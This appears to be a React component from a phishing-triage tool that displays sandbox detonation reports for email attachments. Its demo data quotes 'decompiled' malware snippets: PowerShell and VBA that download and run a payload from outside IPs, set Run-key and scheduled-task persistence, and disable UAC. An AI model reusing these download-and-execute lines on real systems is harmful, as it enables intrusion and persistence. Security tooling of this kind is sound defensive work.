import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
  Cpu, Terminal, Network, Shield, Hash, Eye, AlertTriangle,
  ChevronDown, ChevronUp, Copy, Check, Activity, GitBranch,
  HardDrive, Globe, Key, Zap, Clock, Code2, FileWarning,
  Crosshair, Layers, Radio, RefreshCw
} from 'lucide-react';
import { CaseDetail, AttachmentItem } from '../../types';

interface AttachmentSandboxViewProps {
  caseDetail: CaseDetail;
}

// ─── Types ───────────────────────────────────────────────────────────────────
interface ProcessNode {
  pid: number; ppid: number; name: string; cmd: string;
  suspicious: boolean; children?: ProcessNode[];
}
interface NetworkEvent {
  t: string; proto: string; dir: 'OUT' | 'IN'; host: string;
  ip: string; port: number; bytes: number; flag: 'C2' | 'DNS' | 'HTTP' | 'DROP';
}
interface RegEvent { op: 'WRITE' | 'CREATE' | 'DELETE'; key: string; value: string; risk: boolean; }
interface FsEvent { op: 'CREATE' | 'WRITE' | 'DELETE' | 'EXEC'; path: string; risk: boolean; }
interface ApiCall { ts: string; fn: string; args: string; ret: string; risk: boolean; }
interface MitreTag { id: string; name: string; tactic: string; }

// ─── Demo data per attachment ─────────────────────────────────────────────────
const SANDBOX_DATA: Record<number, {
  verdict: 'MALWARE' | 'SUSPICIOUS' | 'CLEAN';
  confidence: number;
  family: string;
  type: string;
  tldr: string;
  detonation_time_ms: number;
  entropy: number;
  magic: string;
  magicLabel: string;
  sha256: string;
  yara: string[];
  procesTree: ProcessNode;
  network: NetworkEvent[];
  registry: RegEvent[];
  filesystem: FsEvent[];
  apiCalls: ApiCall[];
  mitre: MitreTag[];
  decompiled: { line: string; color: 'comment' | 'url' | 'cmd' | 'reg' | 'normal' | 'string' }[];
}> = {
  0: {
    verdict: 'MALWARE', confidence: 97, family: 'PhishPhantom.PDF.Dropper',
    type: 'PDF Weaponized Dropper', tldr: 'PDF contains embedded JavaScript executed on open via /OpenAction. JS decodes base64 PowerShell dropper that fetches stage-2 PE from C2 and achieves persistence via registry run key.',
    detonation_time_ms: 2140, entropy: 7.31,
    magic: '25 50 44 46 2D 31 2E 37', magicLabel: '%PDF-1.7',
    sha256: 'a3f8b2c91e4d7f0e5b6a8c3d9e2f1b4a7c0e3f6b9d2a5c8e1f4b7a0d3e6f9b2',
    yara: ['PDF_EMBEDDED_JAVASCRIPT', 'POWERSHELL_BASE64_ENCODED', 'PHISHPHANTOM_DROPPER_V3', 'URI_SCHEME_PAYLOAD'],
    procesTree: {
      pid: 1, ppid: 0, name: 'AcroRd32.exe', cmd: 'AcroRd32.exe Invoice_Payment_84920.pdf', suspicious: false,
      children: [{
        pid: 2, ppid: 1, name: 'powershell.exe', cmd: 'powershell.exe -WindowStyle Hidden -enc QnkgT0ZGU0hPUkU...', suspicious: true,
        children: [{
          pid: 3, ppid: 2, name: 'cmd.exe', cmd: 'cmd.exe /c "$env:TEMP\\svchost32.exe"', suspicious: true,
          children: [{ pid: 4, ppid: 3, name: 'svchost32.exe', cmd: 'svchost32.exe --install --silent', suspicious: true }]
        }]
      }]
    },
    network: [
      { t: '00:01.2', proto: 'DNS', dir: 'OUT', host: 'micr0soft-login-check.net', ip: '185.234.218.71', port: 53, bytes: 64, flag: 'DNS' },
      { t: '00:01.4', proto: 'HTTP', dir: 'OUT', host: 'micr0soft-login-check.net', ip: '185.234.218.71', port: 80, bytes: 128, flag: 'C2' },
      { t: '00:02.1', proto: 'HTTP', dir: 'IN', host: 'micr0soft-login-check.net', ip: '185.234.218.71', port: 80, bytes: 487424, flag: 'DROP' },
      { t: '00:03.5', proto: 'HTTPS', dir: 'OUT', host: 'track.vendor-invoice-cdn.net', ip: '194.165.16.82', port: 443, bytes: 512, flag: 'C2' },
    ],
    registry: [
      { op: 'WRITE', key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', value: 'SysUpdate = %TEMP%\\svchost32.exe', risk: true },
      { op: 'CREATE', key: 'HKCU\\Software\\PhantomUpdate\\Config', value: 'server = 185.234.218.71:8080', risk: true },
      { op: 'WRITE', key: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', value: 'EnableLUA = 0', risk: true },
    ],
    filesystem: [
      { op: 'CREATE', path: '%TEMP%\\svchost32.exe', risk: true },
      { op: 'WRITE', path: '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.lnk', risk: true },
      { op: 'CREATE', path: '%TEMP%\\invoice_decoy.pdf', risk: false },
      { op: 'EXEC', path: '%TEMP%\\svchost32.exe', risk: true },
    ],
    apiCalls: [
      { ts: '00:01.1', fn: 'WinExec', args: 'powershell.exe -enc ...', ret: '0x1', risk: true },
      { ts: '00:01.3', fn: 'URLDownloadToFile', args: 'http://185.234.218.71/stage2.exe', ret: 'S_OK', risk: true },
      { ts: '00:01.9', fn: 'RegSetValueEx', args: 'HKCU\\Run\\SysUpdate', ret: 'ERROR_SUCCESS', risk: true },
      { ts: '00:02.0', fn: 'CreateProcess', args: '%TEMP%\\svchost32.exe --install', ret: '0x1', risk: true },
      { ts: '00:02.1', fn: 'IsDebuggerPresent', args: '', ret: '0x0', risk: false },
      { ts: '00:02.4', fn: 'VirtualAllocEx', args: 'size=0x4000, PAGE_EXECUTE_READWRITE', ret: '0x1A000000', risk: true },
    ],
    mitre: [
      { id: 'T1059.001', name: 'PowerShell', tactic: 'Execution' },
      { id: 'T1547.001', name: 'Registry Run Keys', tactic: 'Persistence' },
      { id: 'T1055',     name: 'Process Injection', tactic: 'Defense Evasion' },
      { id: 'T1071.001', name: 'Web Protocols C2', tactic: 'C&C' },
      { id: 'T1027',     name: 'Obfuscated Files', tactic: 'Defense Evasion' },
      { id: 'T1566.001', name: 'Spearphishing Attachment', tactic: 'Initial Access' },
    ],
    decompiled: [
      { line: '// PDF /OpenAction extracted JavaScript', color: 'comment' },
      { line: 'var oDoc = this;', color: 'normal' },
      { line: 'var raw = "QnkgT0ZGU0hPUkUgSW52b2ljZVBheW1lbnQ=";', color: 'string' },
      { line: 'var dec = Base64.decode(raw);', color: 'normal' },
      { line: 'app.launchURL("http://micr0soft-login-check.net/login?ref=a8f2", true);', color: 'url' },
      { line: '', color: 'normal' },
      { line: '// Decoded PowerShell dropper (base64 → plaintext):', color: 'comment' },
      { line: '$c = New-Object System.Net.WebClient', color: 'cmd' },
      { line: '$c.DownloadFile("http://185.234.218.71/stage2.exe", "$env:TEMP\\svchost32.exe")', color: 'url' },
      { line: 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"', color: 'reg' },
      { line: '  -Name "SysUpdate" -Value "$env:TEMP\\svchost32.exe"', color: 'reg' },
      { line: 'Start-Process "$env:TEMP\\svchost32.exe" -WindowStyle Hidden', color: 'cmd' },
    ],
  },
  1: {
    verdict: 'MALWARE', confidence: 94, family: 'Emotet.Maldoc.VBA',
    type: 'Office VBA Macro Dropper', tldr: 'DOCM file with auto-executing VBA Document_Open macro. Performs environment anti-sandbox checks, then spawns cmd.exe to fetch Emotet loader. Establishes persistence via registry run key and scheduled task.',
    detonation_time_ms: 3870, entropy: 6.84,
    magic: 'D0 CF 11 E0 A1 B1 1A E1', magicLabel: 'OLE2/CFBF (Office doc)',
    sha256: 'f7e2d4b6a1c9e3f5b8d0a2c4e6f8b0d2a4c6e8f0b2d4a6c8e0f2b4d6a8c0e2f4',
    yara: ['EMOTET_VBA_DROPPER', 'OFFICE_MACRO_AUTORUN', 'ANTI_SANDBOX_CHECKS', 'SCHEDULED_TASK_PERSIST'],
    procesTree: {
      pid: 1, ppid: 0, name: 'WINWORD.EXE', cmd: 'WINWORD.EXE PaymentUpdate_Authorization.docm', suspicious: false,
      children: [{
        pid: 2, ppid: 1, name: 'cmd.exe', cmd: 'cmd.exe /c powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(...)"', suspicious: true,
        children: [
          {
            pid: 3, ppid: 2, name: 'powershell.exe', cmd: 'powershell.exe -ep bypass -c IEX...', suspicious: true,
            children: [{ pid: 4, ppid: 3, name: 'schtasks.exe', cmd: 'schtasks /create /tn SystemUpdateCheck /tr ...', suspicious: true }]
          },
          { pid: 5, ppid: 2, name: 'wscript.exe', cmd: 'wscript.exe //B %TEMP%\\update.vbs', suspicious: true }
        ]
      }]
    },
    network: [
      { t: '00:02.3', proto: 'DNS', dir: 'OUT', host: 'cdn-update-svc.net', ip: '185.220.101.45', port: 53, bytes: 64, flag: 'DNS' },
      { t: '00:02.5', proto: 'HTTP', dir: 'OUT', host: 'cdn-update-svc.net', ip: '185.220.101.45', port: 8080, bytes: 256, flag: 'C2' },
      { t: '00:02.8', proto: 'HTTP', dir: 'IN', host: 'cdn-update-svc.net', ip: '185.220.101.45', port: 8080, bytes: 234880, flag: 'DROP' },
      { t: '00:03.9', proto: 'HTTP', dir: 'OUT', host: 'cdn-update-svc.net', ip: '185.220.101.45', port: 8080, bytes: 820, flag: 'C2' },
    ],
    registry: [
      { op: 'WRITE', key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', value: 'SecurityCheck = %TEMP%\\emotet_loader.exe', risk: true },
      { op: 'WRITE', key: 'HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security', value: 'VBAWarnings = 1', risk: true },
      { op: 'CREATE', key: 'HKLM\\SOFTWARE\\Classes\\CLSID\\{random-guid}', value: 'COM hijack stub', risk: true },
    ],
    filesystem: [
      { op: 'CREATE', path: '%TEMP%\\emotet_loader.exe', risk: true },
      { op: 'CREATE', path: '%TEMP%\\update.vbs', risk: true },
      { op: 'WRITE', path: '%APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.lnk', risk: true },
      { op: 'EXEC', path: 'schtasks.exe /create /tn SystemUpdateCheck', risk: true },
    ],
    apiCalls: [
      { ts: '00:01.0', fn: 'IsDebuggerPresent', args: '', ret: '0x0', risk: false },
      { ts: '00:01.1', fn: 'GetTickCount', args: 'anti-sandbox uptime check', ret: '35200', risk: false },
      { ts: '00:02.2', fn: 'WinExec', args: 'cmd.exe /c powershell -w hidden...', ret: '0x1', risk: true },
      { ts: '00:02.6', fn: 'InternetOpenUrl', args: 'http://185.220.101.45:8080/gate.php', ret: '0x1', risk: true },
      { ts: '00:03.1', fn: 'WriteFile', args: '%TEMP%\\emotet_loader.exe, 234880 bytes', ret: 'ERROR_SUCCESS', risk: true },
      { ts: '00:03.4', fn: 'CreateScheduledTask', args: '/tn SystemUpdateCheck /sc ONLOGON', ret: 'S_OK', risk: true },
    ],
    mitre: [
      { id: 'T1137.001', name: 'Office Template Macros', tactic: 'Persistence' },
      { id: 'T1059.003', name: 'Windows Cmd Shell', tactic: 'Execution' },
      { id: 'T1053.005', name: 'Scheduled Task', tactic: 'Persistence' },
      { id: 'T1497',     name: 'Sandbox Evasion', tactic: 'Defense Evasion' },
      { id: 'T1105',     name: 'Ingress Tool Transfer', tactic: 'C&C' },
      { id: 'T1204.002', name: 'Malicious File', tactic: 'Execution' },
    ],
    decompiled: [
      { line: "' VBA extracted from vbaProject.bin (OLE stream)", color: 'comment' },
      { line: "Sub Document_Open()", color: 'cmd' },
      { line: "  ' Anti-sandbox: check uptime & debugger", color: 'comment' },
      { line: "  If IsDebuggerPresent() Or GetTickCount() < 120000 Then Exit Sub", color: 'normal' },
      { line: "  Dim oSh As Object", color: 'normal' },
      { line: '  Set oSh = CreateObject("WScript.Shell")', color: 'normal' },
      { line: '  oSh.Run "powershell -w hidden -ep bypass -c ' + "'IEX (New-Object Net.WebClient)" + '.DownloadString(", 0', color: 'url' },
      { line: '    "http://185.220.101.45:8080/gate.php")', color: 'url' },
      { line: '  oSh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityCheck",', color: 'reg' },
      { line: '               Environ("TEMP") & "\\emotet_loader.exe", "REG_SZ"', color: 'reg' },
      { line: "  oSh.Run \"schtasks /create /tn SystemUpdateCheck /tr \" & Environ(\"TEMP\") & \"\\emotet_loader.exe /sc ONLOGON\", 0", color: 'cmd' },
      { line: "End Sub", color: 'cmd' },
    ],
  },
};

// ─── Demo fallback attachments ───────────────────────────────────────────────
const DEMO_ATTACHMENTS: AttachmentItem[] = [
  { attachment_id: 'ATT-001', filename: 'Invoice_Payment_84920.pdf', mime_type: 'application/pdf', size_bytes: 487424, sha256: 'a3f8b2c91e4d7f0e5b6a8c3d9e2f1b4a7c0e3f6b9d2a5c8e1f4b7a0d3e6f9b2', is_executable: false, is_macro_enabled: false, risk_level: 'HIGH' },
  { attachment_id: 'ATT-002', filename: 'PaymentUpdate_Authorization.docm', mime_type: 'application/vnd.ms-word.document.macroEnabled.12', size_bytes: 234880, sha256: 'f7e2d4b6a1c9e3f5b8d0a2c4e6f8b0d2a4c6e8f0b2d4a6c8e0f2b4d6a8c0e2f4', is_executable: false, is_macro_enabled: true, risk_level: 'HIGH' },
];

// ─── Process Tree ─────────────────────────────────────────────────────────────
const PTree: React.FC<{ node: ProcessNode; depth?: number }> = ({ node, depth = 0 }) => (
  <div style={{ marginLeft: depth * 20 }}>
    <div
      className="flex items-center gap-2 py-1.5 px-3 rounded-lg mb-1 group"
      style={{
        background: node.suspicious ? 'rgba(239,68,68,0.07)' : 'rgba(10,18,35,0.6)',
        border: `1px solid ${node.suspicious ? 'rgba(239,68,68,0.25)' : 'rgba(30,41,59,0.6)'}`,
      }}
    >
      {depth > 0 && (
        <span className="text-[10px] select-none" style={{ color: '#334155', fontFamily: 'JetBrains Mono, monospace' }}>└─</span>
      )}
      <span className="text-[11px] font-bold" style={{ fontFamily: 'JetBrains Mono, monospace', color: node.suspicious ? '#fca5a5' : '#67e8f9' }}>
        {node.name}
      </span>
      <span className="text-[9px] px-1.5 py-0.5 rounded" style={{ fontFamily: 'JetBrains Mono, monospace', background: 'rgba(30,41,59,0.6)', color: '#475569' }}>
        PID:{node.pid}
      </span>
      {node.suspicious && (
        <span className="text-[9px] font-bold px-1.5 py-0.5 rounded" style={{ fontFamily: 'JetBrains Mono, monospace', background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.3)', color: '#fca5a5' }}>
          SUSPICIOUS
        </span>
      )}
      <span className="flex-1 text-[10px] truncate" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#334155' }}>
        {node.cmd}
      </span>
    </div>
    {node.children?.map(child => <PTree key={child.pid} node={child} depth={depth + 1} />)}
  </div>
);

// ─── Network row ──────────────────────────────────────────────────────────────
const FLAG_STYLES = {
  C2:   { bg: 'rgba(239,68,68,0.12)',  border: 'rgba(239,68,68,0.4)',  text: '#fca5a5' },
  DNS:  { bg: 'rgba(6,182,212,0.08)',  border: 'rgba(6,182,212,0.3)',  text: '#67e8f9' },
  HTTP: { bg: 'rgba(245,158,11,0.08)', border: 'rgba(245,158,11,0.3)', text: '#fcd34d' },
  DROP: { bg: 'rgba(168,85,247,0.08)', border: 'rgba(168,85,247,0.3)', text: '#d8b4fe' },
};

// ─── Verdict ring ─────────────────────────────────────────────────────────────
const VerdictRing: React.FC<{ verdict: string; confidence: number }> = ({ verdict, confidence }) => {
  const color = verdict === 'MALWARE' ? '#ef4444' : verdict === 'SUSPICIOUS' ? '#f59e0b' : '#10b981';
  const r = 30; const circ = 2 * Math.PI * r;
  const fill = (confidence / 100) * circ;
  return (
    <div className="relative flex items-center justify-center" style={{ width: 80, height: 80 }}>
      <svg width={80} height={80} style={{ transform: 'rotate(-90deg)' }}>
        <circle cx={40} cy={40} r={r} fill="none" stroke="rgba(30,41,59,0.8)" strokeWidth={5} />
        <circle cx={40} cy={40} r={r} fill="none" stroke={color} strokeWidth={5} strokeLinecap="round"
          strokeDasharray={circ} strokeDashoffset={circ - fill}
          style={{ filter: `drop-shadow(0 0 6px ${color}80)`, transition: 'stroke-dashoffset 1.2s ease' }} />
      </svg>
      <div className="absolute inset-0 flex flex-col items-center justify-center">
        <span className="text-lg font-bold leading-none" style={{ fontFamily: 'JetBrains Mono, monospace', color }}>{confidence}%</span>
        <span className="text-[8px] font-bold leading-none mt-0.5" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#475569' }}>CONF</span>
      </div>
    </div>
  );
};

// ─── Typing terminal ──────────────────────────────────────────────────────────
const TypingTerminal: React.FC<{ lines: { line: string; color: string }[] }> = ({ lines }) => {
  const colorMap: Record<string, string> = {
    comment: '#475569', url: '#f87171', cmd: '#fcd34d',
    reg: '#c084fc', string: '#6ee7b7', normal: '#94a3b8',
  };
  const [visible, setVisible] = useState(0);
  useEffect(() => {
    setVisible(0);
    const timers = lines.map((_, i) => setTimeout(() => setVisible(i + 1), i * 90));
    return () => timers.forEach(clearTimeout);
  }, [lines.length]);

  return (
    <div className="p-4 rounded-xl font-mono text-[10px] leading-relaxed overflow-x-auto"
         style={{ background: 'rgba(2,4,15,0.97)', border: '1px solid rgba(6,182,212,0.15)', minHeight: 180 }}>
      {/* Terminal bar */}
      <div className="flex items-center gap-1.5 mb-3 pb-2" style={{ borderBottom: '1px solid rgba(30,41,59,0.5)' }}>
        <div className="w-2.5 h-2.5 rounded-full" style={{ background: '#ef4444' }} />
        <div className="w-2.5 h-2.5 rounded-full" style={{ background: '#f59e0b' }} />
        <div className="w-2.5 h-2.5 rounded-full" style={{ background: '#10b981' }} />
        <span className="ml-2 text-[9px]" style={{ color: '#334155', fontFamily: 'JetBrains Mono, monospace' }}>
          trace-x / static-decompiler — payload.asm
        </span>
      </div>
      {lines.map((l, i) => (
        <div
          key={i}
          className="flex gap-3"
          style={{ opacity: i < visible ? 1 : 0, transition: 'opacity 0.15s ease' }}
        >
          <span className="w-6 text-right select-none shrink-0" style={{ color: '#1e293b' }}>
            {l.line ? i + 1 : ''}
          </span>
          <span style={{ color: colorMap[l.color] ?? '#94a3b8', whiteSpace: 'pre' }}>
            {l.line || ' '}
          </span>
        </div>
      ))}
      {visible >= lines.length && (
        <div className="flex gap-3 mt-1">
          <span className="w-6 text-right select-none shrink-0" style={{ color: '#1e293b' }}></span>
          <span style={{ color: '#06b6d4' }}>█</span>
        </div>
      )}
    </div>
  );
};

// ─── Simulated detonation progress ───────────────────────────────────────────
const useDetonation = (key: string) => {
  const [phase, setPhase] = useState(0);
  const [done, setDone] = useState(false);
  useEffect(() => {
    setPhase(0); setDone(false);
    const steps = [200, 500, 900, 1300, 1800, 2400];
    const timers = steps.map((ms, i) => setTimeout(() => { setPhase(i + 1); if (i === steps.length - 1) setDone(true); }, ms));
    return () => timers.forEach(clearTimeout);
  }, [key]);
  return { phase, done };
};

const DETONATION_STEPS = [
  'Mounting read-only MIME payload snapshot',
  'Extracting embedded streams and OLE objects',
  'Running YARA ruleset (4318 signatures)',
  'Disassembling payload bytecode',
  'Mapping Win32 API call patterns',
  'Generating behavioral report',
];

// ─── Live SandboxCard (fetches from API) ─────────────────────────────────────
const SandboxCard: React.FC<{ att: AttachmentItem; caseId: string; idx: number }> = ({ att, caseId, idx }) => {
  const [d, setD] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [tab, setTab] = useState<'overview' | 'process' | 'network' | 'registry' | 'fs' | 'api' | 'code'>('overview');
  const { phase, done } = useDetonation(att.attachment_id);

  const fetchDetonation = useCallback(async () => {
    setLoading(true); setError(null);
    try {
      const res = await fetch(`http://127.0.0.1:8000/api/v1/cases/${caseId}/sandbox/${att.attachment_id}/detonate`, { method: 'POST' });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      setD(await res.json());
    } catch (e: any) {
      setError(e.message || 'Detonation failed');
    } finally {
      setLoading(false);
    }
  }, [caseId, att.attachment_id]);

  useEffect(() => { fetchDetonation(); }, [fetchDetonation]);

  if (loading || !d) {
    return (
      <div className="rounded-2xl overflow-hidden animate-fade-in" style={{ background: 'rgba(7,12,24,0.98)', border: '1px solid rgba(30,41,59,0.9)', padding: '2rem', animationDelay: `${idx * 120}ms` }}>
        <div className="flex items-center gap-3">
          <Radio className="w-5 h-5 text-fuchsia-400 animate-pulse" />
          <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#d946ef' }}>
            STATIC DETONATION IN PROGRESS — {att.filename}
          </span>
        </div>
        <div className="mt-4 space-y-1">
          {DETONATION_STEPS.map((s, i) => (
            <div key={i} className="flex items-center gap-2">
              <div className="w-3.5 h-3.5 shrink-0 flex items-center justify-center">
                {phase > i ? <span style={{ color: '#10b981', fontSize: '0.65rem' }}>OK</span>
                  : phase === i ? <div className="w-2 h-2 rounded-full bg-fuchsia-400 animate-pulse" />
                  : <div className="w-2 h-2 rounded-full" style={{ background: '#1e293b' }} />}
              </div>
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.625rem', color: phase > i ? '#10b981' : phase === i ? '#d946ef' : '#1e293b', transition: 'color 0.3s' }}>{s}</span>
            </div>
          ))}
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="rounded-2xl overflow-hidden" style={{ background: 'rgba(7,12,24,0.98)', border: '1px solid rgba(239,68,68,0.3)', padding: '1.5rem', animationDelay: `${idx * 120}ms` }}>
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2 text-red-400" style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem' }}>
            <AlertTriangle className="w-4 h-4" /> DETONATION ERROR — {att.filename}: {error}
          </div>
          <button onClick={fetchDetonation} className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-mono font-bold" style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.3)', color: '#fca5a5' }}>
            <RefreshCw className="w-3 h-3" /> RETRY
          </button>
        </div>
      </div>
    );
  }

  const verdictColor = d.verdict === 'MALWARE' ? '#ef4444' : d.verdict === 'SUSPICIOUS' ? '#f59e0b' : '#10b981';

  const TABS = [
    { id: 'overview', label: 'OVERVIEW',    icon: Layers },
    { id: 'process',  label: 'PROC TREE',   icon: GitBranch },
    { id: 'network',  label: 'NETWORK',     icon: Network },
    { id: 'registry', label: 'REGISTRY',    icon: Key },
    { id: 'fs',       label: 'FILESYSTEM',  icon: HardDrive },
    { id: 'api',      label: 'API CALLS',   icon: Terminal },
    { id: 'code',     label: 'DECOMPILED',  icon: Code2 },
  ] as const;


  return (
    <div
      className="rounded-2xl overflow-hidden animate-block-appear"
      style={{
        background: 'rgba(7,12,24,0.98)',
        border: '1px solid rgba(30,41,59,0.9)',
        boxShadow: '0 8px 40px rgba(0,0,0,0.6)',
        animationDelay: `${idx * 120}ms`,
      }}
    >
      {/* ── Detonation header ── */}
      <div
        className="px-5 py-4"
        style={{ background: 'linear-gradient(135deg, rgba(239,68,68,0.07), rgba(10,18,35,0.95))', borderBottom: '1px solid rgba(30,41,59,0.7)' }}
      >
        <div className="flex items-start gap-4">
          {/* Verdict ring */}
          <VerdictRing verdict={d.verdict} confidence={done ? d.confidence : 0} />

          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2 mb-1 flex-wrap">
              <span
                className="text-sm font-bold px-3 py-1 rounded-lg"
                style={{
                  fontFamily: 'JetBrains Mono, monospace',
                  background: `${verdictColor}18`,
                  border: `1px solid ${verdictColor}50`,
                  color: verdictColor,
                  boxShadow: `0 0 12px ${verdictColor}25`,
                }}
              >
                {d.verdict}
              </span>
              <span className="text-sm font-bold text-slate-100">{att.filename}</span>
              {att.is_macro_enabled && (
                <span className="text-[9px] px-2 py-0.5 rounded font-bold"
                      style={{ fontFamily: 'JetBrains Mono, monospace', background: 'rgba(245,158,11,0.1)', border: '1px solid rgba(245,158,11,0.3)', color: '#fcd34d' }}>MACRO</span>
              )}
            </div>
            <p className="text-[11px] mb-2" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#a855f7' }}>
              {d.family} · {d.type}
            </p>
            <p className="text-[11px] leading-relaxed" style={{ color: '#64748b' }}>{d.tldr}</p>
          </div>

          <div className="shrink-0 text-right space-y-1.5">
            <div className="text-[9px]" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#334155' }}>DETONATION TIME</div>
            <div className="text-lg font-bold" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#06b6d4' }}>{d.detonation_time_ms}ms</div>
            <div className="text-[10px]" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#334155' }}>{att.mime_type.split('/').pop()?.toUpperCase()} · {(att.size_bytes / 1024).toFixed(0)} KB</div>
          </div>
        </div>

        {/* Detonation progress */}
        {!done && (
          <div className="mt-4 p-3 rounded-xl animate-fade-in"
               style={{ background: 'rgba(6,182,212,0.04)', border: '1px solid rgba(6,182,212,0.15)' }}>
            <div className="flex items-center gap-2 mb-2">
              <Radio className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
              <span className="text-[10px] font-bold text-cyan-400" style={{ fontFamily: 'JetBrains Mono, monospace' }}>
                STATIC DETONATION IN PROGRESS...
              </span>
            </div>
            <div className="space-y-1">
              {DETONATION_STEPS.map((s, i) => (
                <div key={i} className="flex items-center gap-2">
                  <div className="w-3.5 h-3.5 shrink-0 flex items-center justify-center">
                    {phase > i
                      ? <span style={{ color: '#10b981', fontSize: '0.65rem' }}>OK</span>
                      : phase === i
                      ? <div className="w-2 h-2 rounded-full bg-cyan-400 animate-pulse" />
                      : <div className="w-2 h-2 rounded-full" style={{ background: '#1e293b' }} />
                    }
                  </div>
                  <span className="text-[10px]" style={{
                    fontFamily: 'JetBrains Mono, monospace',
                    color: phase > i ? '#10b981' : phase === i ? '#67e8f9' : '#1e293b',
                    transition: 'color 0.3s ease',
                  }}>{s}</span>
                </div>
              ))}
            </div>
            <div className="mt-2 neon-progress">
              <div className="neon-progress-fill" style={{ width: `${(phase / DETONATION_STEPS.length) * 100}%`, background: 'linear-gradient(90deg, #06b6d4, #a855f7)', transition: 'width 0.4s ease' }} />
            </div>
          </div>
        )}

        {/* MITRE ATT&CK tags */}
        {done && (
          <div className="mt-3 flex flex-wrap gap-1.5 animate-fade-in">
            {d.mitre.map((m: any) => (
              <div key={m.id} className="flex items-center gap-1.5 px-2 py-1 rounded-lg"
                   style={{ background: 'rgba(168,85,247,0.08)', border: '1px solid rgba(168,85,247,0.2)' }}>
                <Crosshair className="w-2.5 h-2.5" style={{ color: '#a855f7' }} />
                <span className="text-[9px] font-bold" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#a855f7' }}>{m.id}</span>
                <span className="text-[9px]" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#64748b' }}>{m.name}</span>
                <span className="text-[8px] px-1 py-0.5 rounded" style={{ background: 'rgba(168,85,247,0.12)', color: '#7c3aed', fontFamily: 'JetBrains Mono, monospace' }}>{m.tactic}</span>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* ── Tab bar ── */}
      <div className="flex overflow-x-auto" style={{ borderBottom: '1px solid rgba(30,41,59,0.7)', background: 'rgba(5,10,20,0.8)' }}>
        {TABS.map(({ id, label, icon: Icon }) => (
          <button
            key={id}
            onClick={() => setTab(id as any)}
            className="flex items-center gap-1.5 px-4 py-2.5 shrink-0 transition-all"
            style={{
              fontFamily: 'JetBrains Mono, monospace',
              fontSize: '0.65rem',
              fontWeight: 700,
              color: tab === id ? '#06b6d4' : '#334155',
              borderBottom: tab === id ? '2px solid #06b6d4' : '2px solid transparent',
              background: tab === id ? 'rgba(6,182,212,0.05)' : 'transparent',
            }}
          >
            <Icon className="w-3 h-3" />
            {label}
          </button>
        ))}
      </div>

      {/* ── Tab content ── */}
      <div className="p-5">
        {/* OVERVIEW */}
        {tab === 'overview' && (
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 animate-fade-in">
            {/* File info */}
            <div className="rounded-xl p-4 space-y-3" style={{ background: 'rgba(10,18,35,0.8)', border: '1px solid rgba(30,41,59,0.6)' }}>
              <span className="text-[9px] font-bold uppercase" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#475569' }}>FILE FORENSICS</span>
              {[
                { l: 'MAGIC BYTES', v: `${d.magic}` },
                { l: 'FORMAT', v: d.magic_label },
                { l: 'ENTROPY', v: `${d.entropy.toFixed(2)} / 8.0` },
                { l: 'SIZE', v: `${(att.size_bytes / 1024).toFixed(1)} KB` },
              ].map(({ l, v }) => (
                <div key={l} className="flex items-center justify-between">
                  <span className="text-[9px]" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#475569' }}>{l}</span>
                  <span className="text-[10px] font-bold" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#e2e8f0' }}>{v}</span>
                </div>
              ))}
              <div>
                <span className="text-[9px]" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#475569' }}>SHA-256</span>
                <code className="text-[9px] break-all block mt-1" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#334155' }}>{att.sha256}</code>
              </div>
            </div>
            {/* Entropy bar + YARA */}
            <div className="rounded-xl p-4 space-y-4" style={{ background: 'rgba(10,18,35,0.8)', border: '1px solid rgba(30,41,59,0.6)' }}>
              <div>
                <span className="text-[9px] font-bold uppercase" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#475569' }}>SHANNON ENTROPY</span>
                <div className="flex justify-between items-center mt-1 mb-1.5">
                  <span className="text-[10px]" style={{ fontFamily: 'JetBrains Mono, monospace', color: d.entropy > 6.5 ? '#ef4444' : '#f59e0b' }}>
                    {d.entropy > 6.5 ? 'PACKED / ENCRYPTED' : 'PARTIALLY OBFUSCATED'}
                  </span>
                  <span className="text-[11px] font-bold" style={{ fontFamily: 'JetBrains Mono, monospace', color: d.entropy > 6.5 ? '#ef4444' : '#f59e0b' }}>{d.entropy}</span>
                </div>
                <div className="neon-progress">
